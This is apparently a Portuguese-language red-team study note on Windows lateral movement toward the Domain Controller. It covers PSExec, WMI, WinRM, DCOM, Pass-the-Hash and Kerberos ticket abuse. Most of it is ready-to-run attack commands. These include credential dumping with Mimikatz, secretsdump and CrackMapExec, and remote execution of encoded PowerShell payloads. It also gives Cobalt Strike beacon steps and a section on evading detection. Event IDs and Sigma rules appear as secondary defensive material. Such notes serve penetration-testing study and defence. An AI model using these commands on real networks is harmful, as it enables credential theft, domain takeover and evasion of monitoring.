---
title: "Lateral Movement — Windows"
---

# Movimento Lateral em Windows - Tecnicas e Ferramentas

## De Um Host Para o Domain Controller

Movimento lateral é a habilidade de se mover de um sistema comprometido para outros sistemas na rede. Em um ambiente Windows corporativo, o objetivo é quase sempre comprometer o Domain Controller para obter controle total do domínio.

Entender os mecanismos exatos de cada técnica é fundamental porque diferentes ambientes têm diferentes proteções (firewalls internos, AV, EDR), cada técnica deixa artefatos distintos nos logs, e o custo de OPSEC varia muito entre abordagens. Cobalt Strike, Impacket e ferramentas nativas têm comportamentos distintos que afetam a detecção.

ATT&CK relacionado: T1021.002 (PSExec/SMB), T1021.006 (WinRM), T1047 (WMI), T1021.003 (DCOM), T1550.002 (Pass the Hash).

---

## Credencial, Porta, Permissão: Os Três Pré-requisitos

### Prerequisitos para Lateral Movement

Para mover-se lateralmente, voce precisa de:

```
1. Credenciais validas (senha, hash NTLM, ticket Kerberos)
2. Acesso de rede ao host alvo (porta aberta)
3. Permissao no host alvo (geralmente admin local ou domain admin)

Portas tipicamente necessarias:
- SMB: 445 (e 139 legado)
- WMI/DCOM: 135 (RPC endpoint mapper) + porta dinamica alta
- WinRM: 5985 (HTTP) / 5986 (HTTPS)
- RDP: 3389
```

### Verificar Conectividade Antes de Tentar

```powershell
# Testar SMB
Test-NetConnection -ComputerName TARGET -Port 445

# Testar WinRM
Test-WSMan -ComputerName TARGET

# Testar conectividade geral
Test-NetConnection -ComputerName TARGET -Port 135
```

---

## Na Pratica

### Checklist de Lateral Movement

1. Identificar hosts na rede (via BloodHound, net view, LDAP)
2. Verificar credenciais disponiveis (senhas, hashes, tickets)
3. Identificar qual protocolo esta acessivel no alvo
4. Escolher tecnica com menor footprint de deteccao
5. Executar e verificar acesso
6. Repetir a partir do novo host

---

## Exemplos de Codigo / Comandos

### 1. PSExec

PSExec funciona copiando um executavel de servico para `ADMIN$` (que mapeia para `C:\Windows\`), criando um servico Windows, executando via SCM (Service Control Manager) e removendo o servico apos uso.

```
Fluxo interno PSExec:
1. Conecta via SMB ao share ADMIN$ do alvo
2. Copia PSEXESVC.EXE (ou nome aleatorio) para C:\Windows\
3. Conecta ao SCM via RPC (port 445)
4. Cria servico temporario apontando para o executavel
5. Inicia o servico
6. Comunicacao de I/O via named pipe
7. Remove o servico e o executavel ao terminar
```

#### Sysinternals PSExec

```cmd
:: Executar cmd.exe no alvo com credenciais
PsExec.exe \\TARGET_IP -u DOMAIN\user -p senha123 cmd.exe

:: Executar como SYSTEM
PsExec.exe \\TARGET_IP -u DOMAIN\user -p senha123 -s cmd.exe

:: Executar em multiplos hosts
PsExec.exe \\192.168.1.10,192.168.1.11,192.168.1.12 -u admin -p senha cmd.exe

:: Copiar e executar arquivo local no alvo
PsExec.exe \\TARGET_IP -u admin -p senha -c payload.exe

:: Executar PowerShell
PsExec.exe \\TARGET_IP -u admin -p senha powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass
```

#### Impacket psexec.py

```bash
# Uso basico
psexec.py DOMAIN/user:senha@TARGET_IP

# Com hash (Pass-the-Hash)
psexec.py DOMAIN/user@TARGET_IP -hashes :NTLM_HASH
psexec.py DOMAIN/user@TARGET_IP -hashes LMHASH:NTLMHASH

# Executar comando especifico
psexec.py DOMAIN/user:senha@TARGET_IP "whoami && ipconfig"

# Especificar shell
psexec.py DOMAIN/user:senha@TARGET_IP cmd.exe

# Com ticket Kerberos (Pass-the-Ticket)
export KRB5CCNAME=/tmp/ticket.ccache
psexec.py -k -no-pass DOMAIN/user@TARGET_FQDN
```

#### Cobalt Strike PSExec

```
# Via Beacon interativo
jump psexec TARGET_HOST LISTENER_NAME
jump psexec64 TARGET_HOST LISTENER_NAME    # 64-bit
jump psexec_psh TARGET_HOST LISTENER_NAME  # PowerShell loader (sem arquivo EXE)

# Via aggressor/headless
beacon> jump psexec TARGET admin

# Remote-exec (sem criar novo beacon, apenas executa comando)
remote-exec psexec TARGET cmd /c whoami
```

#### Artefatos e Deteccao PSExec

```
Event IDs gerados no ALVO:
- 7045: A new service was installed (PSEXESVC ou nome aleatorio)
- 4624: Logon Type 3 (network logon) com usuario especificado
- 5140: Network share object was accessed (ADMIN$)
- 7036: Service started/stopped

Artefatos de filesystem:
- C:\Windows\PSEXESVC.EXE (ou nome aleatorio com Impacket)
- Named pipe: \\TARGET\pipe\psexesvc ou \\TARGET\pipe\{GUID}

Regra Sigma basica:
title: PsExec Service Installation
detection:
  selection:
    EventID: 7045
    ServiceFileName|contains:
      - 'PSEXESVC'
      - '\Windows\psexe'
```

---

### 2. WMI (Windows Management Instrumentation)

WMI usa DCOM/RPC para comunicacao. Conecta na porta 135 (RPC endpoint mapper) que redireciona para uma porta alta dinamica. Nao cria servicos, mas cria processos filho do WMI. Menos artefatos que PSExec.

```
Fluxo interno WMI:
1. Conecta via RPC na porta 135 (endpoint mapper)
2. Negocia porta alta para comunicacao DCOM
3. Instancia classe Win32_Process
4. Chama metodo Create()
5. Processo criado como filho de WmiPrvSE.exe
```

#### wmic.exe (nativo Windows)

```cmd
:: Executar processo no alvo
wmic /node:TARGET_IP /user:DOMAIN\user /password:senha process call create "cmd.exe /c whoami > C:\Windows\Temp\out.txt"

:: Ler o output
wmic /node:TARGET_IP /user:DOMAIN\user /password:senha datafile where name='C:\\Windows\\Temp\\out.txt' get name

:: Verificar processos rodando
wmic /node:TARGET_IP /user:DOMAIN\user /password:senha process list brief

:: Encerrar processo
wmic /node:TARGET_IP /user:DOMAIN\user /password:senha process where (processid=1234) delete

:: Executar powershell encodado
wmic /node:TARGET_IP /user:admin /password:senha process call create "powershell -enc BASE64PAYLOAD"
```

#### PowerShell WMI

```powershell
# Criar objeto de credenciais
$username = "DOMAIN\user"
$password = ConvertTo-SecureString "senha123" -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential($username, $password)

# Executar processo via WMI
$wmi = [wmiclass]"\\TARGET_IP\root\cimv2:Win32_Process"
$result = $wmi.Create("cmd.exe /c whoami > C:\Windows\Temp\out.txt")

# Alternativa com Invoke-WmiMethod
Invoke-WmiMethod -ComputerName TARGET_IP -Credential $cred -Class Win32_Process -Name Create -ArgumentList "cmd.exe /c calc.exe"

# CIM (mais moderno, usa WSMan ou DCOM)
$session = New-CimSession -ComputerName TARGET_IP -Credential $cred
Invoke-CimMethod -CimSession $session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = "calc.exe"}
```

#### Impacket wmiexec.py

```bash
# Shell interativo via WMI
wmiexec.py DOMAIN/user:senha@TARGET_IP

# Pass-the-Hash
wmiexec.py DOMAIN/user@TARGET_IP -hashes :NTLM_HASH

# Executar comando unico (nao interativo)
wmiexec.py DOMAIN/user:senha@TARGET_IP "whoami"

# Output e salvo em arquivo temporario no ADMIN$ e deletado
```

#### Cobalt Strike WMI

```
# Criar beacon no alvo via WMI
jump wmi TARGET_HOST LISTENER_NAME

# Executar comando via WMI sem criar beacon
remote-exec wmi TARGET_HOST whoami

# WMI com credenciais especificas
beacon> make_token DOMAIN\user senha
beacon> jump wmi TARGET_HOST LISTENER_NAME
beacon> rev2self  # reverter para token original
```

#### Artefatos WMI

```
Event IDs:
- 4688: Process Creation (WmiPrvSE.exe spawning child)
- 4624: Logon Type 3
- Microsoft-Windows-WMI-Activity/Operational: Event 5857, 5858, 5859, 5860, 5861

Sysmon:
- Event 1: Process create com parent WmiPrvSE.exe
- Event 3: Network connection na porta 135

Artefatos de disco:
- Praticamente nenhum (processo criado em memoria)
- Log WMI em: C:\Windows\System32\wbem\Logs\

Regra Sigma:
title: WMI Lateral Movement
detection:
  selection:
    EventID: 1  # Sysmon process create
    ParentImage|endswith: '\WmiPrvSE.exe'
    Image|endswith:
      - '\cmd.exe'
      - '\powershell.exe'
```

---

### 3. WinRM / PowerShell Remoting

WinRM (Windows Remote Management) e a implementacao Microsoft do protocolo WS-Management. Permite execucao remota de PowerShell. Mais logging que WMI mas ainda menos que PSExec.

```
Pre-requisitos:
- WinRM habilitado no alvo (nao habilitado por padrao em workstations)
- Firewall liberado (5985/5986)
- Usuario na lista de WinRM permissions (geralmente admins locais)
```

Verificar se WinRM esta ativo:
```powershell
# No alvo (se tiver acesso local)
Get-Service WinRM
Test-WSMan -ComputerName localhost

# Remotamente
Test-NetConnection TARGET_IP -Port 5985
Test-WSMan -ComputerName TARGET_IP

# Habilitar WinRM (se tiver acesso local ou via GPO)
Enable-PSRemoting -Force
Set-Item WSMan:\localhost\Client\TrustedHosts -Value "192.168.1.*" -Force
```

#### Enter-PSSession (sessao interativa)

```powershell
# Sessao interativa
$cred = Get-Credential
Enter-PSSession -ComputerName TARGET_IP -Credential $cred

# Com SSL
Enter-PSSession -ComputerName TARGET_IP -UseSSL -Credential $cred

# Sessao criada anteriormente
$session = New-PSSession -ComputerName TARGET_IP -Credential $cred
Enter-PSSession -Session $session
```

#### Invoke-Command (execucao remota)

```powershell
# Executar bloco de script remotamente
Invoke-Command -ComputerName TARGET_IP -Credential $cred -ScriptBlock { whoami; hostname }

# Executar arquivo de script local no alvo remoto
Invoke-Command -ComputerName TARGET_IP -Credential $cred -FilePath C:\local\script.ps1

# Em multiplos hosts
$hosts = @("192.168.1.10", "192.168.1.11", "192.168.1.12")
Invoke-Command -ComputerName $hosts -Credential $cred -ScriptBlock { hostname }

# Usar sessao existente
$session = New-PSSession -ComputerName TARGET_IP -Credential $cred
Invoke-Command -Session $session -ScriptBlock { Get-Process }
```

#### evil-winrm

```bash
# Conexao basica
evil-winrm -i TARGET_IP -u user -p senha123

# Pass-the-Hash
evil-winrm -i TARGET_IP -u user -H NTLM_HASH

# Com SSL
evil-winrm -i TARGET_IP -u user -p senha -S

# Upload e download de arquivos
# Dentro da sessao:
upload /local/path/file.exe C:\Windows\Temp\file.exe
download C:\Users\user\Desktop\file.txt /local/

# Carregar modulos PowerShell
# Dentro da sessao:
menu → usar comandos como Invoke-Mimikatz (se modulos carregados)

# Especificar porta
evil-winrm -i TARGET_IP -u user -p senha -P 5986
```

#### Artefatos WinRM

```
Event IDs no alvo:
- 4624: Logon Type 3 (network) ou Type 8 (NetworkCleartext)
- Microsoft-Windows-WinRM/Operational: Events 6 (connection attempt), 169
- Microsoft-Windows-PowerShell/Operational: 40961, 40962 (inicio de sessao)
- 4103, 4104: Script block logging (se habilitado)

Portas:
- 5985: HTTP (texto claro, mas autenticacao via Kerberos/NTLM)
- 5986: HTTPS

Processo gerado:
- wsmprovhost.exe (pai dos comandos remotos)
```

---

### 4. DCOM (Distributed COM)

DCOM permite instanciar objetos COM em sistemas remotos via RPC. E mais furtivo que PSExec pois nao cria servicos e o processo pai parece legitimo.

#### MMC20.Application

```powershell
# Instanciar MMC remotamente
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", "TARGET_IP"))
$com.Document.ActiveView.ExecuteShellCommand("cmd.exe", $null, "/c calc.exe", "7")

# Parametros do ExecuteShellCommand:
# 1: Command (executavel)
# 2: Directory (null = default)
# 3: Parameters
# 4: WindowState (7 = minimizado/oculto)

# Payload mais util
$com.Document.ActiveView.ExecuteShellCommand(
    "powershell.exe",
    $null,
    "-enc BASE64_PAYLOAD",
    "7"
)
```

#### ShellWindows

```powershell
# Instanciar ShellWindows
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("Shell.Application", "TARGET_IP"))
$item = $com.Windows()
$item.Document.Application.ShellExecute("cmd.exe", "/c whoami > C:\temp\out.txt", "C:\Windows\System32", $null, 0)
```

#### ShellBrowserWindow

```powershell
# Objeto mais discreto
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("ShellBrowserWindow", "TARGET_IP"))
$com.Document.Application.ShellExecute("cmd.exe", "/c payload", "C:\Windows\System32", $null, 0)
```

#### SCShell (DCOM via Service Control Manager)

SCShell usa DCOM para acessar o SCM remotamente sem usar SMB. Mais dificil de detectar que PSExec tradicional.

```bash
# https://github.com/Mr-Un1k0d3r/SCShell
python3 scshell.py DOMAIN/user:senha@TARGET_IP

# Com hash
python3 scshell.py -hashes :NTLM TARGET_IP DOMAIN user

# Especificar servico para abusar (usa servico existente, nao cria novo)
python3 scshell.py DOMAIN/user:senha@TARGET_IP "cmd /c whoami"
```

#### Impacket dcomexec.py

```bash
# Usar objeto MMC20.Application
dcomexec.py DOMAIN/user:senha@TARGET_IP

# Pass-the-Hash
dcomexec.py -hashes :NTLM_HASH DOMAIN/user@TARGET_IP

# Especificar objeto DCOM
dcomexec.py -object MMC20 DOMAIN/user:senha@TARGET_IP
dcomexec.py -object ShellWindows DOMAIN/user:senha@TARGET_IP
dcomexec.py -object ShellBrowserWindow DOMAIN/user:senha@TARGET_IP
```

#### Portas DCOM

```
135/tcp  → RPC Endpoint Mapper (sempre necessario)
+ porta alta dinamica (49152-65535) → negociada via port mapper

Para filtrar DCOM com firewall:
- Nao e possivel abrir apenas a porta high sem tambem abrir 135
- Alternativa: usar WinRM que usa porta fixa (5985/5986)
```

---

### 5. Pass-the-Hash (PtH)

Pass-the-Hash usa o hash NTLM diretamente em vez da senha em texto claro. Funciona porque autenticacao NTLM nao verifica a senha, mas sim o hash.

```
NTLM Authentication flow:
1. Cliente → Servidor: NEGOTIATE (inicio)
2. Servidor → Cliente: CHALLENGE (nonce aleatorio)
3. Cliente → Servidor: AUTHENTICATE (NTLM_HASH(nonce + hash_da_senha))

No PtH: usamos o HASH diretamente, pulamos a etapa de derivar hash da senha.
```

#### Como Obter Hashes NTLM

```bash
# Via Mimikatz (requer SYSTEM/debug privilege)
mimikatz# privilege::debug
mimikatz# sekurlsa::logonpasswords

# Via Impacket secretsdump (requer admin)
secretsdump.py DOMAIN/admin:senha@TARGET_IP

# Via Impacket secretsdump local (do SAM)
secretsdump.py -sam sam.bak -system system.bak LOCAL

# Formato do hash: LM_HASH:NTLM_HASH
# LM nao e mais usado (aparece como aad3b435b51404eeaad3b435b51404ee)
# NTLM e o que importa: 32 caracteres hex
```

#### PtH com Impacket

```bash
# PSExec com hash
psexec.py DOMAIN/user@TARGET_IP -hashes :NTLM_HASH

# WMI com hash
wmiexec.py DOMAIN/user@TARGET_IP -hashes :NTLM_HASH

# SMB com hash
smbclient.py DOMAIN/user@TARGET_IP -hashes :NTLM_HASH

# Secretsdump com hash (dump de credenciais remotamente)
secretsdump.py DOMAIN/user@TARGET_IP -hashes :NTLM_HASH
```

#### PtH com Mimikatz

```
mimikatz# sekurlsa::pth /user:admin /domain:DOMAIN /ntlm:HASH_AQUI /run:cmd.exe
# Abre novo cmd.exe com token NTLM do usuario especificado
# Nesse cmd.exe, comandos de rede usam o hash automaticamente
```

#### PtH no Windows (crackmapexec)

```bash
# CrackMapExec - ferramenta de swiss army knife para PtH
# Verificar se hash funciona em varios hosts
crackmapexec smb 192.168.1.0/24 -u administrator -H :NTLM_HASH

# Executar comando
crackmapexec smb TARGET_IP -u administrator -H :NTLM_HASH -x "whoami"

# PowerShell
crackmapexec smb TARGET_IP -u administrator -H :NTLM_HASH -X "Get-Process"

# Extrair SAM de todos os hosts acessiveis
crackmapexec smb 192.168.1.0/24 -u administrator -H :NTLM_HASH --sam

# Extrair LSA secrets
crackmapexec smb TARGET_IP -u administrator -H :NTLM_HASH --lsa

# WMI
crackmapexec wmi TARGET_IP -u administrator -H :NTLM_HASH -x "whoami"

# WinRM
crackmapexec winrm TARGET_IP -u administrator -H :NTLM_HASH -x "whoami"
```

---

### 6. Over-Pass-the-Hash / Pass-the-Key

Diferente do PtH que usa NTLM, Over-PtH converte o hash NTLM em um ticket Kerberos TGT. Isso permite acesso a recursos que requerem autenticacao Kerberos.

```
Por que usar:
- Ambientes com Kerberos only (NTLMv2 bloqueado)
- Acesso a servicos que requerem Kerberos (SQL Server, etc)
- Mais dificil de detectar que PtH (Kerberos e "normal")
```

#### Rubeus (em memoria, sem tocar disco)

```powershell
# Obter TGT a partir do hash NTLM
Rubeus.exe asktgt /user:admin /domain:DOMAIN.LOCAL /rc4:NTLM_HASH /ptt

# Obter TGT a partir de chave AES (mais furtivo)
Rubeus.exe asktgt /user:admin /domain:DOMAIN.LOCAL /aes256:AES_HASH /ptt

# /ptt = Pass-the-Ticket (injetar ticket na sessao atual)

# Verificar tickets injetados
Rubeus.exe klist
klist  # comando nativo Windows

# Obter service ticket (TGS) diretamente
Rubeus.exe asktgs /ticket:TGT.kirbi /service:cifs/TARGET.DOMAIN.LOCAL /ptt
```

#### Impacket

```bash
# getTGT - obter ticket a partir de hash
getTGT.py DOMAIN/user -hashes :NTLM_HASH
getTGT.py DOMAIN/user -aesKey AES_HASH

# Usar o ticket
export KRB5CCNAME=/tmp/user.ccache
psexec.py -k -no-pass DOMAIN/user@TARGET.DOMAIN.LOCAL
wmiexec.py -k -no-pass DOMAIN/user@TARGET.DOMAIN.LOCAL
```

---

### Tabela Comparativa das Tecnicas

```
+------------------+--------+-------+----------+---------+-------------------+
| Tecnica          | Porta  | OPSEC | Artefatos | Velocid | Quando usar       |
+------------------+--------+-------+----------+---------+-------------------+
| PSExec           | 445    | Baixo | Alto      | Rapido  | Acesso rapido     |
|                  |        |       | (7045)    |         | sem se preocupar  |
|                  |        |       |           |         | com deteccao      |
+------------------+--------+-------+----------+---------+-------------------+
| WMI              | 135+   | Medio | Medio     | Rapido  | Bypass de AV      |
|                  | highport|      | (WmiPrvSE)|         | simples           |
+------------------+--------+-------+----------+---------+-------------------+
| WinRM            | 5985   | Medio | Medio     | Rapido  | PowerShell        |
|                  | /5986  |       | (wsmprov) |         | remoting          |
+------------------+--------+-------+----------+---------+-------------------+
| DCOM/MMC20       | 135+   | Alto  | Baixo     | Rapido  | Ambientes com     |
|                  | highport|      | (mmc.exe) |         | EDR avancado      |
+------------------+--------+-------+----------+---------+-------------------+
| Pass-the-Hash    | varies | Alto  | Baixo     | Rapido  | Sem senha,        |
|                  |        |       |           |         | apenas hash       |
+------------------+--------+-------+----------+---------+-------------------+
| Over-PtH/Kerb    | 88     | Alto  | Minimo    | Medio   | Kerberos-only     |
|                  |        |       |           |         | ambientes         |
+------------------+--------+-------+----------+---------+-------------------+
```

---

## Deteccao e OPSEC

### Event IDs Criticos para Monitorar

```
4624  - Successful logon (verificar Type)
        Type 2  = Interactive (fisico/console)
        Type 3  = Network (SMB, WinRM)
        Type 4  = Batch (scheduled tasks)
        Type 5  = Service
        Type 7  = Unlock
        Type 8  = NetworkCleartext (WinRM HTTP, raro)
        Type 10 = RemoteInteractive (RDP)

4625  - Failed logon
4648  - Logon using explicit credentials
4688  - Process creation (habilitar com SACL)
4697  - Service installed (mais confiavel que 7045)
4698  - Scheduled task created
4776  - NTLM authentication
5140  - Network share accessed (ADMIN$, C$, IPC$)
7045  - Service installed (pode ser filtrado por nome)
```

### Tecnicas de Evasao

1. Usar nomes de servico aleatorios (Impacket ja faz isso)
2. Preferir DCOM ou WMI sobre PSExec em ambientes monitorados
3. Usar autenticacao Kerberos em vez de NTLM (menos logs)
4. Executar de hosts com privilegios legitimos (nao de Kali direto)
5. Usar C2 beacon ja presente no host para mover-se lateralmente

```powershell
# Usar token de usuario legitimo antes de mover-se
# No Cobalt Strike:
steal_token PID_DO_USUARIO_LEGITIMO
# Agora trafico parece vir do usuario legitimo
```

---

## Módulos Relacionados

`02_lateral_movement_linux_ssh.md` cobre hosts Linux na rede — frequentes em ambientes mistos. `03_pivoting_e_tunelamento.md` é necessário quando o alvo está em segmento isolado sem rota direta. `../09_active_directory/04_dcsync_e_dominancia.md` é o destino natural após comprometer o DC com as técnicas aqui descritas. ATT&CK T1021 (Remote Services) mapeia o conjunto de técnicas desta nota.
- HackTricks Windows LM: https://book.hacktricks.xyz/windows-hardening/lateral-movement
